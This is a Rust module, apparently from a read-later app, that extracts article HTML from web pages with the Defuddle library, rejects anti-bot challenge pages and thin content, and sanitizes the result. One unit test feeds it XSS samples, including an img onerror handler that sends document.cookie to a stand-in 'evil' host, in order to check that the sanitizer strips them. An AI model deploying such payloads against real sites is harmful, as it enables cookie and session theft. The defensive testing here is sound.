use crate::types::{ArtifactMetadata, JsDefuddleArticle};

use super::dom_cleanup::inject_dom_preprocessor;
use super::{CaptureError, CaptureStage};

const DEFUDDLE_JS: &str = include_str!("../defuddle.js");
const MIN_READABLE_WORDS: i32 = 20;
const ANTI_BOT_MARKERS: [&str; 4] = [
    "captcha-delivery.com/captcha",
    "datadome captcha",
    "challenges.cloudflare.com",
    "/cdn-cgi/challenge-platform/",
];

pub(super) async fn extract_defuddle(
    page: &chromiumoxide::Page,
    source_url: Option<&str>,
) -> Result<(String, ArtifactMetadata), CaptureError> {
    let page_html = page.content().await.ok();
    if page_html.as_deref().is_some_and(is_anti_bot_challenge) {
        return Err(CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("page blocked by anti-bot challenge"),
        ));
    }

    inject_dom_preprocessor(page).await?;

    page.evaluate(DEFUDDLE_JS)
        .await
        .map_err(|e| CaptureError::cdp(CaptureStage::Defuddle, e))?;

    let extract_js = r#"
        (() => {
            try {
                const DefuddleClass = globalThis.Defuddle?.default ?? globalThis.Defuddle;
                if (!DefuddleClass) throw new Error('Defuddle not loaded');
                const documentClone = document.cloneNode(true);
                globalThis.IndelibleDomPreprocessor.preprocessDocumentForReadableExtraction(documentClone);
                return new DefuddleClass(documentClone, {
                    url: document.location.href,
                    useAsync: false,
                }).parse();
            } catch(e) { return { error: String(e) }; }
        })()
    "#;

    let eval = page
        .evaluate(extract_js)
        .await
        .map_err(|e| CaptureError::cdp(CaptureStage::Defuddle, e))?;

    let val: serde_json::Value = eval.into_value().map_err(|e| {
        CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("defuddle result deserialize failed: {e}"),
        )
    })?;

    if val.is_null() {
        return Err(CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("defuddle returned null"),
        ));
    }

    let article: JsDefuddleArticle =
        serde_json::from_value(val).map_err(|e| CaptureError::other(CaptureStage::Defuddle, e))?;
    let (html, mut metadata) = defuddle_article_to_output(article, source_url)?;
    if metadata.lead_image.is_none()
        && let Some(page_html) = page_html
    {
        metadata.lead_image = super::lead_image::lead_image_from_html(&page_html, source_url);
    }

    Ok((html, metadata))
}

pub(crate) fn defuddle_article_to_output(
    article: JsDefuddleArticle,
    source_url: Option<&str>,
) -> Result<(String, ArtifactMetadata), CaptureError> {
    if let Some(err) = article.error {
        return Err(CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("defuddle error: {err}"),
        ));
    }

    let content = non_empty(article.content).ok_or_else(|| {
        CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("defuddle produced empty content"),
        )
    })?;
    if is_anti_bot_challenge(&content) {
        return Err(CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("page blocked by anti-bot challenge"),
        ));
    }
    // Defuddle extracts article HTML from an untrusted third-party page; strip active
    // content before it is stored and served as ReadableHtml. This is the server-side
    // guarantee the web reader and mobile WebView rely on. Preparation additionally
    // makes anchors durable for ToC navigation; on rewriter failure the content is
    // still stored sanitized — losing anchors must never lose the article.
    let content = ind_html::prepare_reader_html(&content).unwrap_or_else(|err| {
        tracing::warn!(error = %err, "anchor preparation failed; storing sanitized only");
        ind_html::sanitize_reader_html(&content)
    });
    let word_count = word_count_from_html(&content);
    if word_count < MIN_READABLE_WORDS {
        return Err(CaptureError::other(
            CaptureStage::Defuddle,
            anyhow::anyhow!("defuddle produced too little visible readable content"),
        ));
    }

    let title = non_empty(article.title).unwrap_or_else(|| "Untitled".to_string());

    let html = format!(
        "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body>{content}</body></html>"
    );

    let metadata = ArtifactMetadata {
        title: Some(title),
        byline: non_empty(article.author),
        excerpt: non_empty(article.description),
        word_count: (word_count > 0).then_some(word_count),
        reading_time_minutes: (word_count > 0)
            .then(|| ind_domain::reading_time_minutes_from_words(word_count)),
        domain: source_domain(source_url),
        lead_image: non_empty(article.image),
    };

    Ok((html, metadata))
}

fn non_empty(value: Option<String>) -> Option<String> {
    value
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

fn source_domain(source_url: Option<&str>) -> Option<String> {
    let url = source_url.and_then(|u| url::Url::parse(u).ok())?;
    matches!(url.scheme(), "http" | "https")
        .then(|| url.host_str().map(str::to_string))
        .flatten()
}

fn word_count_from_html(html: &str) -> i32 {
    ind_html::html_to_text(html).split_whitespace().count() as i32
}

fn is_anti_bot_challenge(html: &str) -> bool {
    let normalized = html.to_ascii_lowercase();
    ANTI_BOT_MARKERS
        .iter()
        .any(|marker| normalized.contains(marker))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn article(content: &str) -> JsDefuddleArticle {
        JsDefuddleArticle {
            title: Some("Title".into()),
            content: Some(content.into()),
            author: None,
            description: None,
            image: None,
            error: None,
        }
    }

    #[test]
    fn defuddle_output_strips_active_content_but_keeps_formatting() {
        let (html, _) = defuddle_article_to_output(
            article(
                r#"<p>Hello <strong>world</strong>; careful reporting preserves readable facts, context, evidence, examples, guidance, history, structure, links, images, headings, lists, quotations, and conclusions.</p>
                <script>fetch('//evil')</script>
                <img src="x" onerror="fetch('//evil/'+document.cookie)">
                <a href="javascript:alert(1)">click</a>
                <iframe src="https://evil.example"></iframe>"#,
            ),
            Some("https://example.com/post"),
        )
        .expect("output builds");

        assert!(html.contains("<strong>world</strong>"), "{html}");
        assert!(!html.contains("<script"), "{html}");
        assert!(!html.contains("onerror"), "{html}");
        assert!(!html.contains("javascript:"), "{html}");
        assert!(!html.contains("<iframe"), "{html}");
        // The doctype/body envelope the reader expects is preserved.
        assert!(html.starts_with("<!DOCTYPE html>"), "{html}");
    }

    #[test]
    fn defuddle_output_rejects_navigation_chrome_below_readable_floor() {
        let error = defuddle_article_to_output(
            article(
                r#"<nav>
                <a href="/contest">Contents</a> <a href="/teachers">Teachers</a>
                <a href="/signup">Sign up</a> <a href="/login">Log in</a>
                <a href="/projects">Projects</a> <a href="/contests">Contests</a> <a href="/teachers">Teachers</a>
                <a href="/login">Log In</a> <a href="/signup">Sign Up</a>
                </nav>"#,
            ),
            Some("https://www.instructables.com/Big-Sturdy-Loft/"),
        )
        .expect_err("13 words of navigation chrome must not be published");

        assert_eq!(
            error.to_string(),
            "defuddle: defuddle produced too little visible readable content"
        );
    }

    #[test]
    fn defuddle_output_accepts_exactly_twenty_visible_words() {
        let (_, metadata) = defuddle_article_to_output(
            article(
                "<p>Careful reporting explains how communities restore wetlands, protect wildlife, measure progress, and share practical lessons with future generations across seasons.</p>",
            ),
            Some("https://example.com/wetlands"),
        )
        .expect("20 visible words meet the readable content floor");

        assert_eq!(metadata.word_count, Some(20));
    }
}
